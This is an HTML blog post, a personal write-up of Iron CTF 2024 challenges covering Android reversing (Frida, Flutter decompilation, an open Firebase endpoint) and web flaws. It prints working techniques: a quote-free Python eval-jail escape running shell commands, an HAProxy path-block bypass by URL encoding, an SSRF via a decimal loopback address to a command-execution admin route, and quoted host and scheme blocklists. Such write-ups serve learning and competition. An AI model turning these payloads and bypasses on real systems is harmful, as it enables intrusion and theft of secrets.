@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Iron CTF 2024 Writeup</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Iron CTF 2024 Writeup | grep-user blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Iron CTF 2024 Writeup" />
+<meta name="author" content="grep-user" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hi guys, after long time this weekend I played Iron ctf which is hosted by SASTRA University. Really a wonderful CTF after and I was abled to solve few challenges. I concentrated mostly on android and web challenges, and was able to solve all android challenges as well as few web challenges." />
+<meta property="og:description" content="Hi guys, after long time this weekend I played Iron ctf which is hosted by SASTRA University. Really a wonderful CTF after and I was abled to solve few challenges. I concentrated mostly on android and web challenges, and was able to solve all android challenges as well as few web challenges." />
+<link rel="canonical" href="http://localhost:8001/Iron-CTF-Writeup" />
+<meta property="og:url" content="http://localhost:8001/Iron-CTF-Writeup" />
+<meta property="og:site_name" content="grep-user blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-10-07T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Iron CTF 2024 Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"grep-user","url":"https://grep-user.github.io"},"dateModified":"2024-10-07T00:00:00+05:30","datePublished":"2024-10-07T00:00:00+05:30","description":"Hi guys, after long time this weekend I played Iron ctf which is hosted by SASTRA University. Really a wonderful CTF after and I was abled to solve few challenges. I concentrated mostly on android and web challenges, and was able to solve all android challenges as well as few web challenges.","headline":"Iron CTF 2024 Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8001/Iron-CTF-Writeup"},"url":"http://localhost:8001/Iron-CTF-Writeup"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>grep-user@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Iron CTF 2024 Writeup</h2>
+  <time datetime="2024-10-07T00:00:00+05:30" class="by-line">07 Oct 2024</time>
+  <p>Hi guys, after long time this weekend I played Iron ctf which is hosted by SASTRA University. Really a wonderful CTF after and I was abled to solve few challenges. I concentrated mostly on android and web challenges, and was able to solve all android challenges as well as few web challenges.</p>
+
+<h3 id="contents">Contents</h3>
+<ul>
+  <li>Fire in the Base Camp[Android]</li>
+  <li>Secure Vault[Android]</li>
+  <li>Is this Android[Android]</li>
+  <li>Loan App[Web]</li>
+  <li>b64SiteViewer[Web]</li>
+</ul>
+
+<p><img src="../assets/2024/ironctf/challs.png" alt="" /></p>
+
+<h3 id="fire-in-the-base-camp-android">Fire in the Base Camp [Android]</h3>
+
+<p>From the challenge we can guess that the challenge is based on firebase. Firebase is a real time database which many android application uses. One common security misconfiguration is using firebase databases without authentication, similar to connecting to mysql DB without password. More about this in <a href="https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/">blog</a>.</p>
+
+<p><img src="../assets/2024/ironctf/fire1.png" alt="" /></p>
+
+<p>After decompiling the apk and analyzing mainactivity, we can find that it is using firebase DB. This is a simple dice rolling app which expects count value of <em>9999999</em> to read the flag. Initially I thought it would be easy if I made the counter value to 9999999. My idea is to use frida since it take less effort than manually changing the apk. So I wrote this frida script and ran the app.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Java.perform(()=&gt;{
+	var main;
+    Java.choose("com.example.app3.MainActivity",{
+        onMatch : function(instance){
+			var Int_class = Java.use("java.lang.Integer");
+			var a = Int_class.$new(9999998);
+
+			instance.count.value = a;
+            console.log("[+] instance called" + instance.count.value);
+        },
+        onComplete: function(){}
+    });
+})
+</code></pre></div></div>
+
+<p>Value is set to <strong>9999998</strong> so that the next time If I roll the dice it would become <strong>9999999</strong> and gets the flag. But insted it just toasted <code class="language-plaintext highlighter-rouge">Congratulations!! You know where the flag is.</code> message. The app didn’t even made the request to the URL. So I tried to the make the request URL from the resource file and applying slice but it doesn’t help.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MainActivity.this.mDatabase.child(MainActivity.this.path1 + MainActivity.this.path2 + MainActivity.this.path3 + MainActivity.this.path4 + MainActivity.this.path5).get()
+</code></pre></div></div>
+
+<p>But after few minutes later the toast message made sense. So i just made call to usual <code class="language-plaintext highlighter-rouge">.json</code> endpoint of the firebase URL.</p>
+
+<p><img src="../assets/2024/ironctf/fire2.png" alt="" /></p>
+
+<h3 id="secure-vault-android">Secure Vault [Android]</h3>
+
+<p>In this challenge the objective is to finc the secret password to the vault. Initially I decopiled using jadx and found out that the app was built using <a href="https://flutter.dev/development">flutter</a>. Usually uses flutter using dart VM for running and reverse engineering one is usually harder than normal apk. For this challenge I used a tool called <a href="https://github.com/worawit/blutter">blutter</a>. There is flutter reverse enginneer <a href="https://www.youtube.com/watch?v=RtKOe8HQy8Q">video</a> which explains this well.</p>
+
+<!-- ![](../assets/2024/ironctf/sec.png){:style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%"} -->
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 blutter.py secure_vault/lib/arm64-v8a out_dir
+</code></pre></div></div>
+
+<p>After running the tool we can get the out_dir which contains <code class="language-plaintext highlighter-rouge">asm</code> folder which contains disassembled dart code. Going through the main.dart file found <code class="language-plaintext highlighter-rouge">_checkPassword</code> which checks password with base64 decoded string of <code class="language-plaintext highlighter-rouge">aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0=</code>. After base64 decoding the string, we can get the flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0=" | base64 -d
+ironCTF{0h_my_g0d!!_y0u_br0k3_int0_th3_4pp_4f6e22cba}
+</code></pre></div></div>
+
+<h3 id="is-this-androidandroid">Is this Android[Android]</h3>
+
+<p>This challenge as title suggested not an android challenge but rather a web challenge. Initially we are given calculator app based on flutter which performs calculation. But instead it showed error for any calculations.</p>
+
+<p><img src="../assets/2024/ironctf/calc.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%" /></p>
+
+<p>After revering it like the previous app, we can find <strong>calc.dart</strong> in asm folder which contains the assembly code. To start our reversing I started searching for the string <code class="language-plaintext highlighter-rouge">Error!</code>, which we got while trying to calculate values from the app. The search leads us nearer to the <code class="language-plaintext highlighter-rouge">_calculate</code> function. The function looks it calls endpoint `` with our input to evaluate the expression.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    // 0x22eb14: r1 = "https://calc.1nf1n1ty.team/calculate"
+    //     0x22eb14: add             x1, PP, #9, lsl #12  ; [pp+0x9ce8] "https://calc.1nf1n1ty.team/calculate"
+					...
+    //     0x22eb20: bl              #0x183b44  ; [dart:core] Uri::parse
+					...
+    //     0x22eb40: add             x16, PP, #9, lsl #12  ; [pp+0x9cf8] "application/json"
+					...
+    //     0x22eb4c: add             x16, PP, #9, lsl #12  ; [pp+0x9d00] TypeArguments: &lt;String, String&gt;
+					...
+    //     0x22eb6c: add             x16, PP, #9, lsl #12  ; [pp+0x9d08] "expression"
+                    ...
+    //     0x22ebac: bl              #0x231228  ; [package:http/http.dart] ::post
+
+</code></pre></div></div>
+
+<p>Stripped few lines for ease of understanding. From the assembly code it is clear that the app is trying to make HTTP POST request with json {“expression”:”our_expression”}. Since it is a HTTP request our Burp interceptor should have captured it. But unfortunately I didn’t found any HTTP calls being made from app. So I tried to make one HTTP call.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST -H "Content-Type: application/json" --data-binary $'{\"expression\":\"1+2\"}' "https://calc.1nf1n1ty.team/calculate"
+{"result":3}
+
+</code></pre></div></div>
+
+<p>With the confusion whether to contine to attack mobile app or web app, I asked organizers about it. And they hinted that I am going in correct decision. With this green flag I continued to explore the endpoint and found that it was python server which <code class="language-plaintext highlighter-rouge">eval</code> our input. So basically its going to be a <strong>pyjail</strong> challenge. After tinkering with it for a while found that few keywords like <code class="language-plaintext highlighter-rouge">system</code>, <code class="language-plaintext highlighter-rouge">os</code>, <code class="language-plaintext highlighter-rouge">dir</code> are blocked. Few characters like [’,”,g,f,l,x]. After few trial and errors, I was able to come up with payload which doesn’t use any of the keywords restricted as well as able to bypass single and double quote check by appending characters to form string.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__import__('os').__dict__['popen']('cat /flag.txt').read() # the actual payload
+
+__import__(chr(111)+chr(115)).__dict__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read() 
+</code></pre></div></div>
+
+<p><img src="../assets/2024/ironctf/iron6.png" alt="" /></p>
+
+<h3 id="loan-appweb">Loan App[Web]</h3>
+
+<p>In this challenge, we are given a user registration and login panel. Once logged in we can request loan and according to the soruce provided admin can approve but there is no admin check. So any user can call the endpoint and approve loan. But when accessing admin the server throws <code class="language-plaintext highlighter-rouge">Request forbidden by administrative rules.</code>. After analyzing the source it is clear that <strong>haproxy</strong> is configured as reverse proxy which throws this error. The below haprxy rule denies our request.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frontend http_front
+    mode http
+    bind :80
+    acl is_admin path_beg /admin
+    http-request deny if is_admin
+    default_backend gunicorn
+
+</code></pre></div></div>
+
+<p>When a request URL which begins with <code class="language-plaintext highlighter-rouge">/admin</code> is denied. To bypass tried vaious methods and URL encoding a character or the word <code class="language-plaintext highlighter-rouge">admin</code> works.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST http://loanapp.1nf1n1ty.team/%61dmin/loan/6706c2fd3b619fc5054d4289
+OK #response
+</code></pre></div></div>
+
+<p><img src="../assets/2024/ironctf/iron1.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%" /></p>
+
+<h4 id="wierd-uninted-solution">Wierd Uninted Solution</h4>
+
+<p>After solution someone solved the challege in a really wierd way. The challenge accepts only valid <code class="language-plaintext highlighter-rouge">uuidv4</code> string for registering. But someone googled valid uuidv4 and got uuid from first stackoverflow. After logging in with the same uuidv4 username and password. They were able to get flag, Since some other team have already solved using the same uuidv4 :) .</p>
+
+<p><img src="../assets/2024/ironctf/iron7.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%" /></p>
+
+<h3 id="b64siteviewerweb">b64SiteViewer[Web]</h3>
+
+<p>In this challenge we are welcomed with URL input box which visits our URL. Trying <code class="language-plaintext highlighter-rouge">localhost</code> and <code class="language-plaintext highlighter-rouge">127.0.0.1</code> throws error, after analyzing the source it is clear there are checking with blacklist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+blacklist_scheme=['file','gopher','php','ftp','dict','data']
+blacklist_hostname=['127.0.0.1','localhost','0.0.0.0','::1','::ffff:127.0.0.1']
+if scheme in blacklist_scheme:
+    return render_template_string('blocked scheme')     
+if hostname in blacklist_hostname:
+    return render_template_string('blocked host')
+...
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">http://2130706433:5000</code> URL from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md">payload all the things</a> works. The admin URL route checks for internal ip address check, So we can call admin URL with this SSRF and also it is obvious that it executes command from user input.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@app.route('/admin')
+def admin():
+    remote_addr = request.remote_addr
+    
+    if remote_addr in ['127.0.0.1', 'localhost']:
+        cmd=request.args.get('cmd','id')
+        cmd_blacklist=['REDACTED']
+        if "'" in cmd or '"' in cmd:
+            return render_template_string('Command blocked')
+        for i in cmd_blacklist:
+            if i in cmd:
+                return render_template_string('Command blocked')
+        print(f"Executing: {cmd}")
+        res= subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return res.stdout
+    else:
+        return render_template_string("Don't hack me")
+</code></pre></div></div>
+
+<p>But still there are few restrictions in place. We can’t execute common commands like <code class="language-plaintext highlighter-rouge">cat, python, perl, ...</code> . Using <code class="language-plaintext highlighter-rouge">ls</code> we can find the current directory files, One interesting file <code class="language-plaintext highlighter-rouge">run.sh</code>. <code class="language-plaintext highlighter-rouge">tail</code> command is not blocked ,so we can use tail with file name regex[since app.py, run.sh files are blocked in user input]. <code class="language-plaintext highlighter-rouge">tail -n 10 ap*</code> to get last 10 lines from app.py.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tail -n 10 run*
+</code></pre></div></div>
+
+<p>Flag is set as environment variable in <strong>run.sh</strong> file.</p>
+
+<p><img src="../assets/2024/ironctf/iron4.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%" /></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>grep-user</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
